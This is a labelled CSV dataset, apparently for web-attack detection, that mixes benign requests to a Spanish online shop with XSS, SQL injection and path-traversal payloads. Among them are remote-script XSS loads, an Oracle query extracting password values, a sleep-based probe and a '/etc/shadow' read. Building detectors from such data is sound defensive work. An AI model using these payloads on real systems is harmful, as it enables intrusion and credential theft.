payload,type
miembros/editar.jsp?modo=registro&login=ellswort&password=randera&nombre=Kamil&apellidos=Borb%F3n+Bascomta&email=karpf-valardy%40animextremist.lc&dni=36101090Z&direccion=Calle+Santa+Pola%2C+7+&ciudad=Iglesuela+del+Cid%2C+La&cp=20159&provincia=Huesca&ntc=3661940651728423&B1=Registrar,normal
.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\{FILE},traversal
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE},traversal
imagenes/3.gif,normal
"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/productos.jsp,normal
"o1UE1: select * from users where id=1 *1 union select 1,banner from v$version where rownum=1 -- 1",sqli
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
publico/productos.jsp,normal
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
global/creditos.jsp,normal
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,xss
global/titulo.jsp,normal
"<;SCRIPT/XSS SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<img src\x00=x onerror=""javascript:alert(1)"">",xss
global/creditos.jsp,normal
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/logo.gif,normal
"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",xss
miembros/index.jsp,normal
"<IMG SRC=""jav&#x0D;ascript:alert(<WBR>'XSS');"">",xss
global/creditos.jsp,normal
<script>document.vulnerable=true;</script>,xss
global/estilos.css,normal
"sUE\c: select * from users where id='1' union select \#,@@VERSION -- 1'",sqli
"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",xss
miembros/imagenes/castro.jpg,normal
imagenes/3.gif,normal
global/estilos.css,normal
miembros/editar.jsp?modo=registro&login=joudrey&password=barcote&nombre=Clovis&apellidos=Vilca+Llora&email=ilijev%40mauroman.tc&dni=64575959D&direccion=El+Provencio%2C+6+8F&ciudad=Montell%E0+i+Martinet&cp=05240&provincia=Cuenca&ntc=7647479172246248&B1=Registrar,normal
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,xss
"n1UEv: select * from users where id=1 +$ 1 union select null,@@VERSION -- 1",sqli
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal
publico/caracteristicas.jsp?id=2,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/ogono.jpg,normal
"<;SCRIPT SRC="";http://ha.ckers.org/xss.jpg"";>;<;/SCRIPT>;",xss
"UE1n,: select * from users where id=1 union select .1_,version() -- 1",sqli
publico/registro.jsp?modo=registro&login=torcac2&password=pir%F3scafo&nombre=Agostina&apellidos=Camino+De+Mendonca&email=komarov%40docerosas.dk&dni=92106863M&direccion=Calle+Radio%2C+89+10F&ciudad=Torreblascopedro&cp=31153&provincia=Asturias&ntc=6202334892240470&B1=Registrar,normal
miembros/fotos.jsp,normal
"<div style=""font-family:foo}color=red;"">XXX",xss
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",xss
global/estilos.css,normal
"<IMG SRC=x onmouseup=""alert(String.fromCharCode(88,83,83))"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"o1UEv: select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1",sqli
<h1><font color=blue>hellox worldss</h1>,xss
imagenes/1.gif,normal
"<img\x11src=x onerror=""javascript:alert(1)"">",xss
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss
publico/carrito.jsp,normal
global/estilos.css,normal
"<img \x34src=x onerror=""javascript:alert(1)"">",xss
"<img src=""javascript:alert(1)"">",xss
miembros/imagenes/zarauz.jpg,normal
?,sqli
..//{FILE},traversal
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=14&B1=A%F1adir+al+carrito,normal
imagenes/1.gif,normal
global/creditos.jsp,normal
global/menum.jsp,normal
..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE},traversal
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
tz_offset,sqli
"<;DIV STYLE="";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029"";>;",xss
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},traversal
&lt;,xss
imagenes/cmenbul.gif,normal
miembros/imagenes/ogono.jpg,normal
"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
publico/pagar.jsp?modo=insertar&precio=9740&B1=Confirmar,normal
1oo1&: select * from users where id=1 + \+%1 or 1=1 -- 1,sqli
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=32&B1=A%F1adir+al+carrito,normal
miembros/index.jsp,normal
publico/pagar.jsp?modo=insertar&precio=7003&B1=Confirmar,normal
publico/registro.jsp?modo=registro&login=gretal3&password=carbunclo&nombre=Cruz&apellidos=Chilel&email=braschi_courtneidge%40djbroadcast.an&dni=00660335M&direccion=Carretera+Industrial+149%2C+&ciudad=Sojuela&cp=04869&provincia=Navarra&ntc=4431931876895268&B1=Registrar,normal
imagenes/3.gif,normal
miembros/imagenes/ogono.jpg,normal
imagenes/3.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/caracteristicas.jsp?id=2,normal
..%252f..%252f..%252f..%252f{FILE},traversal
%uff0e%uff0e%u2216{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
miembros/imagenes/ogono.jpg,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=33&B1=A%F1adir+al+carrito,normal
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/pagar.jsp?modo=insertar&precio=7634&B1=Confirmar,normal
publico/productos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",xss
imagenes/2.gif,normal
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",xss
miembros/imagenes/castro.jpg,normal
publico/autenticar.jsp?modo=entrar&login=kaycee&pwd=Ro3eraL&remember=on&B1=Entrar,normal
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
imagenes/nuestratierra.jpg,normal
%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,traversal
"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",xss
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},traversal
" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
imagenes/1.gif,normal
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},traversal
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
imagenes/cmenbul.gif,normal
publico/caracteristicas.jsp?id=1,normal
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",xss
publico/pagar.jsp?modo=insertar&precio=8664&B1=Confirmar,normal
<;SCRIPT SRC=http://ha.ckers.org/xss.js,xss
imagenes/1.gif,normal
publico/productos.jsp,normal
"s&.on: select * from users where id='1' or \.<$ union select 1,@@VERSION -- 1'",sqli
miembros/imagenes/zarauz.jpg,normal
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<;IMG SRC=javascript:alert(';XSS';)>;,xss
"<img\x10src=x onerror=""javascript:alert(1)"">",xss
..///..///..///..///..///..///{FILE},traversal
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.vulnerable=true;"">",xss
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
global/titulo.jsp,normal
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;,xss
"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",xss
imagenes/2.gif,normal
publico/productos.jsp,normal
imagenes/logo.gif,normal
publico/autenticar.jsp?modo=entrar&login=baudoin&pwd=destullecer&remember=on&B1=Entrar,normal
miembros/imagenes/castro.jpg,normal
"s??s: select * from users where id=1 or ""??"" or 1=1 -- 1",sqli
imagenes/1.gif,normal
imagenes/1.gif,normal
"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
///%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
“><s”%2b”cript>alert(document.cookie)</script>,xss
.\..\{FILE},traversal
index.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/index.jsp,normal
<script>javascript:alert(1)</script\x0B,xss
global/menum.jsp,normal
global/creditos.jsp,normal
global/menum.jsp,normal
\\\%2e%2e%5c{FILE},traversal
global/creditos.jsp,normal
miembros/editar.jsp?modo=registro&login=poseidon6&password=pasote&nombre=Braian&apellidos=Porro&email=kristl%40voragolive.vn&dni=20061667D&direccion=C%2F+Torre+De+Romo+S%2FN+1F&ciudad=Gines&cp=21700&provincia=Alicante&ntc=1819477389412406&B1=Registrar,normal
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
global/menum.jsp,normal
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
"s?n: select * from users where id=1 or ""?["" or 1=1 -- 1",sqli
miembros/editar.jsp?modo=registro&login=naresh&password=72nt89CT7V1&nombre=Eulalio&apellidos=Escudero+Ostria&email=gorse%4016horas.yu&dni=86274990N&direccion=Calle+Fermin+Salvochea+155+&ciudad=Alcolea+del+Pinar&cp=14230&provincia=Teruel&ntc=0981560265462116&B1=Registrar,normal
imagenes/2.gif,normal
&#x03C,xss
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"";>;",xss
or 1=1#,sqli
<body oninput=javascript:alert(1)><input autofocus>,xss
miembros/imagenes/zarauz.jpg,normal
..\\\..\\\..\\\{FILE},traversal
imagenes/cmenbul.gif,normal
"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
imagenes/3.gif,normal
miembros/imagenes/ogono.jpg,normal
..%255c..%255c..%255c..%255c{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE},traversal
index.jsp,normal
publico/registro.jsp?modo=registro&login=jean-yve&password=reTEjAdOR&nombre=Cancia&apellidos=O%27Kinghtons+Camarena&email=olrich-shapiro1%40nuriamartin.aw&dni=97060354D&direccion=Senda+Buen+Paso+S%2FN%2C+&ciudad=Luesia&cp=22390&provincia=Asturias&ntc=8267431025409914&B1=Registrar,normal
global/estilos.css,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/logo.gif,normal
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,xss
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
"<IMG SRC=x oninput=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/1.gif,normal
miembros/imagenes/castro.jpg,normal
miembros/editar.jsp?modo=registro&login=xiaojing&password=coNtRadiCha&nombre=Iara&apellidos=Noya+Driu&email=milton%40diagnosticoradiologico.asia&dni=97426856Y&direccion=C%2F+Fuente+Pista+De+Tenis%2C+164+&ciudad=Aliseda&cp=40560&provincia=Le%F3n&ntc=5798582876895008&B1=Registrar,normal
"<img src\x13=x onerror=""javascript:alert(1)"">",xss
publico/pagar.jsp?modo=insertar&precio=9805&B1=Confirmar,normal
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",xss
<input onblur=javascript:alert(1) autofocus><input autofocus>,xss
miembros/imagenes/ogono.jpg,normal
exec(@s),sqli
"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",xss
..%c0%af..%c0%af..%c0%af..%c0%af{FILE},traversal
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=81&B1=A%F1adir+al+carrito,normal
imagenes/nuestratierra.jpg,normal
publico/productos.jsp,normal
miembros/imagenes/ogono.jpg,normal
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
imagenes/cmenbul.gif,normal
..%2f..%2f..%2f..%2f..%2f{FILE},traversal
"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">",xss
miembros/salir.jsp,normal
publico/miembros.jsp,normal
imagenes/logo.gif,normal
<title onpropertychange=javascript:alert(1)></title><title title=>,xss
global/titulo.jsp,normal
imagenes/1.gif,normal
publico/miembros.jsp,normal
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal
miembros/salir.jsp,normal
index.jsp,normal
../../../../../../{FILE},traversal
"sUE.c: select * from users where id='1' union select \.#,@@VERSION -- 1'",sqli
"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;",xss
"<img\x13src=x onerror=""javascript:alert(1)"">",xss
global/creditos.jsp,normal
publico/productos.jsp,normal
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",xss
publico/caracteristicas.jsp?id=2,normal
"<;A HREF="";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/"";>;XSS<;/A>;",xss
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE},traversal
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;,xss
imagenes/nuestratierra.jpg,normal
<;HTML xmlns:xss>;,xss
imagenes/nuestratierra.jpg,normal
miembros/editar.jsp?modo=registro&login=maxsom&password=2s323a657a679&nombre=Silvia&apellidos=Alfonso&email=szarabajka%40queinvento.si&dni=86464472C&direccion=C%2F+Ce%F1a%2C+107%2C+&ciudad=Cijuela&cp=22809&provincia=Navarra&ntc=5525531016614315&B1=Registrar,normal
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,xss
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
publico/autenticar.jsp?modo=entrar&login=aguistin&pwd=iNnota&remember=on&B1=Entrar,normal
publico/productos.jsp,normal
global/estilos.css,normal
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",xss
..\..\{FILE},traversal
imagenes/1.gif,normal
publico/miembros.jsp,normal
' or ''-',sqli
miembros/imagenes/castro.jpg,normal
publico/registro.jsp?modo=registro&login=omura5&password=cont5975614s74&nombre=Amelia&apellidos=Tolosa+Fontanet&email=boa4%40sitienesunawebtienesunnegocio.es&dni=00947908D&direccion=Calle+Arenys+De+Mar%2C+113%2C+&ciudad=Maials&cp=11690&provincia=Le%F3n&ntc=7627570556544379&B1=Registrar,normal
"UE(1): select * from users where id=1 union select (1),banner from v$version where rownum=1 -- 1",sqli
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
\\&apos;/bin/cat%20/etc/shadow\\&apos;,traversal
publico/productos.jsp,normal
imagenes/3.gif,normal
%2A%28%7C%28mail%3D%2A%29%29,sqli
miembros/imagenes/ogono.jpg,normal
"sn)s: select * from users where id=1 or ""_)"" or 1=1 -- 1",sqli
imagenes/nuestratierra.jpg,normal
miembros/imagenes/castro.jpg,normal
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",xss
global/titulo.jsp,normal
imagenes/1.gif,normal
"<IMG SRC= onmouseover=""alert('xxs')"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,xss
publico/miembros.jsp,normal
imagenes/3.gif,normal
"<;HEAD>;<;META HTTP-EQUIV="";CONTENT-TYPE""; CONTENT="";text/html; charset=UTF-7"";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-",xss
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
miembros/imagenes/castro.jpg,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",sqli
global/estilos.css,normal
<img src=&{document.vulnerable=true;};>,xss
..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal
o()&1: select * from users where id=1 %(\) or 1=1 -- 1,sqli
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,sqli
imagenes/logo.gif,normal
"'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",sqli
publico/registro.jsp?modo=registro&login=riggsbee&password=cuart%F3n&nombre=Seliem&apellidos=Scoccia&email=steinfeld%40multireform.sg&dni=43751883H&direccion=C%2F+Sant+Gon%E7al+166+9-B&ciudad=Catoira&cp=10131&provincia=Barcelona&ntc=8179154437661538&B1=Registrar,normal
' or 'something' like 'some%',sqli
"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",xss
global/menum.jsp,normal
admin') or '1'='1'--,sqli
imagenes/1.gif,normal
publico/autenticar.jsp?modo=entrar&login=choong&pwd=d1se3ci%F3n&remember=off&B1=Entrar,normal
global/menum.jsp,normal
.../.../.../.../.../.../.../{FILE},traversal
imagenes/nuestratierra.jpg,normal
handler,sqli
..%u2215..%u2215..%u2215..%u2215..%u2215{FILE},traversal
<script>var var = 1; alert(var)</script>,xss
<svg><script onlypossibleinopera:-)> alert(1),xss
publico/caracteristicas.jsp?id=1,normal
global/creditos.jsp,normal
publico/miembros.jsp,normal
imagenes/logo.gif,normal
..%2f..%2f{FILE},traversal
"<;A HREF="";http://0102.0146.0007.00000223/"";>;XSS<;/A>;",xss
imagenes/logo.gif,normal
<video poster=javascript:javascript:alert(1)//,xss
"<table background=""javascript:javascript:alert(1)"">",xss
"<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",xss
global/titulo.jsp,normal
miembros/editar.jsp?modo=registro&login=lehar&password=d3s7ota5&nombre=Hip%F3lita&apellidos=Salvi%E0+Figuls&email=ince2%40flexinspect.cat&dni=18178277C&direccion=Calle+Alferez+Gonzalez+Moro+120+11-E&ciudad=Espl%FAs&cp=10294&provincia=A+Coru%F1a&ntc=3714419514854077&B1=Registrar,normal
